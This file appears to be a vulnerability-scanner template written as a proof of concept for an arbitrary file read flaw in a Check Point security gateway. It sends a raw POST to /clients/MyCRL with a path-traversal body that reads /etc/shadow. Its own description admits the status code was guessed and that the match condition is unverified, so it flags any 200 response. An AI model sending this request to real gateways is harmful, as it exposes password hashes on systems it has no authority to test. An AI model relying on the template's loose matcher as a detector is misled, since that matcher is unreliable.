id: poc-yu00hubycxhnl1s0
info:
  name: Check Point安全网关存在任意文件读取漏洞
  author: hacktwo
  severity: high
  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
  tags: lfi,2024
http:
- raw:
  - 'POST /clients/MyCRL HTTP/1.1

    Host: {{Hostname}}

    Content-Length: 39


    aCSHELL/../../../../../../../etc/shadow'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
